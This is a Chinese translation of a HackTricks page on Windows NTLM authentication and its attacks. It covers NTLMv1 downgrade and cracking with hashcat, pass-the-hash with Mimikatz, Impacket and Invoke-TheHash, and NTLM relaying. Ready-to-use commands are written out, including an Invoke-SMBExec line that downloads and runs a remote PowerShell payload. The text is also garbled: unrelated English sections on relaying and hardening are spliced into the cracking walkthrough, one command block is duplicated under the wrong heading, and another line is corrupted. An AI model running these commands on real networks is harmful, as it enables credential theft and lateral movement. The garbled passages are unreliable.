# NTLM

<details>

<summary><strong>从零开始学习AWS黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS红队专家）</strong></a><strong>！</strong></summary>

* 您在**网络安全公司**工作吗？ 想要看到您的**公司在HackTricks中宣传**吗？ 或者想要访问**PEASS的最新版本或下载PDF格式的HackTricks**？ 请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
* 探索[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品
* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**电报群组**](https://t.me/peass) 或在**Twitter**上关注我 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **通过向** [**hacktricks仓库**](https://github.com/carlospolop/hacktricks) **和** [**hacktricks-cloud仓库**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享您的黑客技巧。**

</details>

## 基本信息

在运行**Windows XP和Server 2003**的环境中，通常会使用LM（Lan Manager）哈希，尽管众所周知这些哈希很容易被破解。特定的LM哈希 `AAD3B435B51404EEAAD3B435B51404EE` 表示LM未被使用的情况，代表空字符串的哈希。

默认情况下，**Kerberos**认证协议是主要使用的方法。在特定情况下，NTLM（NT LAN Manager）会介入：缺乏Active Directory、域不存在、由于配置不当导致Kerberos故障，或者尝试使用IP地址而不是有效主机名进行连接。

网络数据包中存在**"NTLMSSP"**头部表示进行了NTLM认证过程。

系统文件 `%windir%\Windows\System32\msv1\_0.dll` 中包含的特定DLL支持LM、NTLMv1和NTLMv2认证协议。

**关键点**：

* LM哈希存在漏洞，空LM哈希 (`AAD3B435B51404EEAAD3B435B51404EE`) 表示未使用。
* Kerberos是默认认证方法，仅在特定条件下使用NTLM。
* 通过"NTLMSSP"头部可识别NTLM认证数据包。
* 系统文件 `msv1\_0.dll` 支持LM、NTLMv1和NTLMv2协议。

## LM、NTLMv1和NTLMv2

您可以检查和配置将使用的协议：

### 图形界面

执行 _secpol.msc_ -> 本地策略 -> 安全选项 -> 网络安全: LAN 管理器身份验证级别。有6个级别（从0到5）。

![](<../../.gitbook/assets/image (919).png>)

### 注册表

这将设置级别5：
```
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ /v lmcompatibilitylevel /t REG_DWORD /d 5 /f
```
可能的取值：
```
0 - Send LM & NTLM responses
1 - Send LM & NTLM responses, use NTLMv2 session security if negotiated
2 - Send NTLM response only
3 - Send NTLMv2 response only
4 - Send NTLMv2 response only, refuse LM
5 - Send NTLMv2 response only, refuse LM & NTLM
```
## 基本的NTLM域身份验证方案

1. **用户**输入他的**凭证**
2. 客户端机器**发送身份验证请求**，发送**域名**和**用户名**
3. **服务器**发送**挑战**
4. **客户端使用密码的哈希加密**挑战，并将其作为响应发送
5. **服务器将**域控制器发送**域名、用户名、挑战和响应**。如果没有配置活动目录或域名是服务器的名称，则在本地**检查凭证**。
6. **域控制器检查一切是否正确**并将信息发送给服务器

**服务器**和**域控制器**能够通过**Netlogon**服务器创建**安全通道**，因为域控制器知道服务器的密码（它在**NTDS.DIT**数据库中）。

### 本地NTLM身份验证方案

身份验证与之前提到的**相同，但是**服务器知道尝试在**SAM**文件中进行身份验证的用户的**哈希**。因此，服务器将**自行检查**用户是否可以进行身份验证。

### NTLMv1挑战

**挑战长度为8字节**，**响应长度为24字节**。

**哈希NT（16字节）**分为**3个部分，每个部分为7字节**（7B + 7B +（2B+0x00\*5））：**最后一部分填充为零**。然后，**挑战**分别与每个部分**加密**，并将**结果加密字节连接**。总计：8B + 8B + 8B = 24字节。

**问题**：

- **缺乏随机性**
- 3个部分可以**分别攻击**以找到NT哈希
- **DES是可破解的**
- 第3个密钥始终由**5个零**组成。
- 给定**相同的挑战**，**响应**将是**相同的**。因此，您可以将字符串“**1122334455667788**”作为**挑战**提供给受害者，并使用**预先计算的彩虹表**攻击使用的响应。

### NTLMv1攻击

现在越来越少地发现配置了无限制委派的环境，但这并不意味着您不能**滥用配置了打印池服务**的情况。

您可以滥用您已经在AD上拥有的一些凭证/会话，要求打印机对某个**您控制的主机**进行身份验证。然后，使用`metasploit auxiliary/server/capture/smb`或`responder`，您可以将身份验证挑战设置为1122334455667788，捕获身份验证尝试，如果使用**NTLMv1**进行身份验证，则可以**破解**。\
如果您使用`responder`，您可以尝试使用标志`--lm`来尝试**降级****身份验证**。\
_请注意，对于此技术，身份验证必须使用NTLMv1执行（NTLMv2无效）。_

请记住，打印机将在身份验证期间使用计算机帐户，并且计算机帐户使用**长且随机的密码**，您**可能无法**使用常见**字典**破解。但**NTLMv1**身份验证**使用DES**（[更多信息请参见此处](./#ntlmv1-challenge)），因此使用一些专门用于破解DES的服务，您将能够破解它（例如，您可以使用[https://crack.sh/](https://crack.sh)）。

### 使用hashcat的NTLMv1攻击

NTLMv1也可以使用NTLMv1多工具[https://github.com/evilmog/ntlmv1-multi](https://github.com/evilmog/ntlmv1-multi)进行破解，该工具以一种可以使用hashcat破解的方法格式化NTLMv1消息。

命令
```bash
python3 ntlmv1.py --ntlmv1 hashcat::DUSTIN-5AA37877:76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595:1122334455667788
```
## NTLM Relaying

### Introduction

NTLM relaying is a common technique used by attackers to move laterally within a network by leveraging the NTLM authentication protocol. This technique involves relaying NTLM authentication messages from a compromised host to another host in order to gain unauthorized access.

### How it works

1. The attacker intercepts an NTLM authentication request from a victim host to a server.
2. The attacker relays this request to another host within the network.
3. The second host processes the authentication request, thinking it is coming from the victim host.
4. If successful, the attacker gains access to the second host using the victim's credentials.

### Mitigation

To mitigate NTLM relaying attacks, it is recommended to:
- Implement SMB signing to prevent interception and tampering of authentication messages.
- Enforce the use of SMB packet signing to ensure the integrity and authenticity of transmitted data.
- Disable NTLM authentication in favor of more secure protocols like Kerberos.
- Regularly monitor network traffic for any suspicious activity related to NTLM authentication.
```bash
['hashcat', '', 'DUSTIN-5AA37877', '76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D', '727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595', '1122334455667788']

Hostname: DUSTIN-5AA37877
Username: hashcat
Challenge: 1122334455667788
LM Response: 76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D
NT Response: 727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
CT1: 727B4E35F947129E
CT2: A52B9CDEDAE86934
CT3: BB23EF89F50FC595

To Calculate final 4 characters of NTLM hash use:
./ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

To crack with hashcat create a file with the following contents:
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788

To crack with hashcat:
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1

To Crack with crack.sh use the following token
NTHASH:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
```
### Windows Hardening - NTLM

---

#### Overview

NTLM (NT LAN Manager) is a suite of Microsoft security protocols that provides authentication, integrity, and confidentiality to users. However, NTLM has known vulnerabilities that can be exploited by attackers to compromise a system. This document outlines techniques to harden Windows systems against NTLM-related attacks.

---

#### Recommendations

1. **Disable NTLMv1**: NTLMv1 is known to be vulnerable to various attacks. It is recommended to disable NTLMv1 and use NTLMv2 or Kerberos for authentication.

2. **Enforce SMB Signing**: Enabling SMB signing helps protect against man-in-the-middle attacks that can tamper with SMB packets. This can be configured via Group Policy.

3. **Restrict NTLM**: Limit the use of NTLM authentication in your environment. Prefer modern authentication mechanisms like Kerberos or LDAP.

4. **Enable LDAP Signing**: LDAP signing ensures the integrity and confidentiality of data exchanged between LDAP clients and servers. This can help prevent LDAP relay attacks.

5. **Monitor NTLM Traffic**: Regularly monitor and analyze NTLM traffic in your network for any suspicious activity. This can help detect potential attacks in their early stages.

6. **Implement Multi-Factor Authentication (MFA)**: MFA adds an extra layer of security by requiring users to provide multiple forms of verification before accessing resources. This can help mitigate the risk of NTLM attacks.

By following these recommendations, you can enhance the security of your Windows systems and reduce the risk of NTLM-related security incidents.
```bash
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788
```
运行 hashcat（最好通过 hashtopolis 等工具进行分布式），否则这将需要几天的时间。
```bash
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1
```
在这种情况下，我们知道密码是password，所以我们将为演示目的而作弊：
```bash
python ntlm-to-des.py --ntlm b4b9b02e6f09a9bd760f388b67351e2b
DESKEY1: b55d6d04e67926
DESKEY2: bcba83e6895b9d

echo b55d6d04e67926>>des.cand
echo bcba83e6895b9d>>des.cand
```
我们现在需要使用hashcat工具将破解的DES密钥转换为NTLM哈希的一部分：
```bash
./hashcat-utils/src/deskey_to_ntlm.pl b55d6d05e7792753
b4b9b02e6f09a9 # this is part 1

./hashcat-utils/src/deskey_to_ntlm.pl bcba83e6895b9d
bd760f388b6700 # this is part 2
```
最后一部分：
```bash
./hashcat-utils/src/ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

586c # this is the last part
```
## NTLM

### Overview

NTLM (NT LAN Manager) is a suite of Microsoft security protocols that provides authentication, integrity, and confidentiality to users. It is commonly used for authentication in Windows environments.

### NTLM Hash

The NTLM hash is a cryptographic hash used in the NTLM authentication protocol. It is generated by using a cryptographic hash function on the user's password. The hash is used to authenticate users without sending their actual password over the network.

### Pass-the-Hash Attack

A pass-the-hash attack is a common technique used by attackers to move laterally within a network without the need to know the user's plaintext password. Instead, the attacker steals the NTLM hash of a user and uses it to authenticate as that user.

### Mitigations

To mitigate pass-the-hash attacks, it is recommended to implement the following security measures:

1. **Use Strong Passwords**: Encourage users to use complex and unique passwords to make it harder to crack the NTLM hash.
2. **Enable NTLMv2**: NTLMv2 is more secure than NTLMv1 and provides better protection against pass-the-hash attacks.
3. **Restrict NTLM**: Limit the use of NTLM where possible and consider transitioning to more secure authentication protocols like Kerberos.

By following these mitigations, organizations can reduce the risk of pass-the-hash attacks and enhance the overall security of their Windows environments.
```bash
NTHASH=b4b9b02e6f09a9bd760f388b6700586c
```
### NTLMv2 Challenge

**挑战长度为8字节**，**发送2个响应**：一个**长度为24字节**，**另一个**的长度是**可变的**。

**第一个响应**是通过使用**HMAC\_MD5**加密由**客户端和域**组成的**字符串**，并使用**NT hash**的**MD4哈希**作为**密钥**来创建的。然后，将**结果**用作使用**HMAC\_MD5**加密**挑战**的**密钥**。为此，将添加**8字节的客户端挑战**。总共：24字节。

**第二个响应**是使用**多个值**（新的客户端挑战，**时间戳**以避免**重放攻击**...）创建的。

如果您有捕获到成功身份验证过程的**pcap文件**，您可以按照此指南获取域、用户名、挑战和响应，并尝试破解密码：[https://research.801labs.org/cracking-an-ntlmv2-hash/](https://research.801labs.org/cracking-an-ntlmv2-hash/)

## Pass-the-Hash

**一旦您获得受害者的哈希值**，您可以使用它来**冒充**受害者。\
您需要使用一个**工具**，该工具将使用**该哈希值执行****NTLM身份验证**，**或**您可以创建一个新的**会话登录**并**注入**该**哈希值**到**LSASS**中，因此当执行任何**NTLM身份验证**时，将使用该**哈希值**。最后一种选择是mimikatz所做的。

**请记住，您也可以使用计算机帐户执行Pass-the-Hash攻击。**

### **Mimikatz**

**需要以管理员身份运行**
```bash
Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:domain.tld /ntlm:NTLMhash /run:powershell.exe"'
```
这将启动一个进程，该进程将属于启动mimikatz的用户，但在LSASS内部，保存的凭据是mimikatz参数中的凭据。然后，您可以访问网络资源，就好像您是那个用户（类似于`runas /netonly`技巧，但您不需要知道明文密码）。

### 从Linux执行Pass-the-Hash

您可以使用Linux从Windows机器中执行Pass-the-Hash来获得代码执行。\
[**点击这里了解如何执行。**](https://github.com/carlospolop/hacktricks/blob/master/windows/ntlm/broken-reference/README.md)

### Impacket Windows编译工具

您可以在此处下载Windows的[Impacket二进制文件](https://github.com/ropnop/impacket_static_binaries/releases/tag/0.9.21-dev-binaries)。

* **psexec\_windows.exe** `C:\AD\MyTools\psexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.my.domain.local`
* **wmiexec.exe** `wmiexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local`
* **atexec.exe**（在这种情况下，您需要指定一个命令，cmd.exe和powershell.exe无法获得交互式shell）`C:\AD\MyTools\atexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local 'whoami'`
* 还有其他几个Impacket二进制文件...

### Invoke-TheHash

您可以从这里获取PowerShell脚本：[https://github.com/Kevin-Robertson/Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)

#### Invoke-SMBExec
```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### 调用-WMIExec
```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### 调用-SMBClient
```bash
Invoke-SMBClient -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 [-Action Recurse] -Source \\dcorp-mgmt.my.domain.local\C$\ -verbose
```
#### 调用 Invoke-SMBEnum
```bash
Invoke-SMBEnum -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 -Target dcorp-mgmt.dollarcorp.moneycorp.local -verbose
```
#### 调用-TheHash

此函数是**所有其他函数的混合**。您可以传递**多个主机**，**排除**某些主机，并**选择**您想要使用的**选项**（_SMBExec，WMIExec，SMBClient，SMBEnum_）。如果您选择**任何**一个**SMBExec**和**WMIExec**，但**不**提供任何 _**Command**_ 参数，它将只是**检查**您是否具有**足够的权限**。
```
Invoke-TheHash -Type WMIExec -Target 192.168.100.0/24 -TargetExclude 192.168.100.50 -Username Administ -ty    h F6F38B793DB6A94BA04A52F1D3EE92F0
```
### [Evil-WinRM 传递哈希](../../network-services-pentesting/5985-5986-pentesting-winrm.md#using-evil-winrm)

### Windows凭证编辑器（WCE）

**需要以管理员身份运行**

此工具将执行与mimikatz相同的操作（修改LSASS内存）。
```
wce.exe -s <username>:<domain>:<hash_lm>:<hash_nt>
```
### 使用用户名和密码手动在Windows上执行远程操作

{% content-ref url="../lateral-movement/" %}
[lateral-movement](../lateral-movement/)
{% endcontent-ref %}

## 从Windows主机中提取凭据

**有关** [**如何从Windows主机获取凭据的更多信息，请阅读此页面**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/ntlm/broken-reference/README.md)**。**

## NTLM中继和Responder

**阅读有关如何执行这些攻击的更详细指南：**

{% content-ref url="../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md" %}
[spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
{% endcontent-ref %}

## 从网络捕获中解析NTLM挑战

**您可以使用** [**https://github.com/mlgualtieri/NTLMRawUnHide**](https://github.com/mlgualtieri/NTLMRawUnHide)

<details>

<summary><strong>从零开始学习AWS黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS红队专家）</strong></a><strong>！</strong></summary>

* 您在**网络安全公司**工作吗？ 想要在**HackTricks中宣传您的公司**？ 或者想要访问**PEASS的最新版本或下载HackTricks的PDF**？ 请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[NFT收藏品**](https://opensea.io/collection/the-peass-family)
* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**电报群组**](https://t.me/peass) 或在**Twitter**上关注我 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* 通过向**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享您的黑客技巧。

</details>
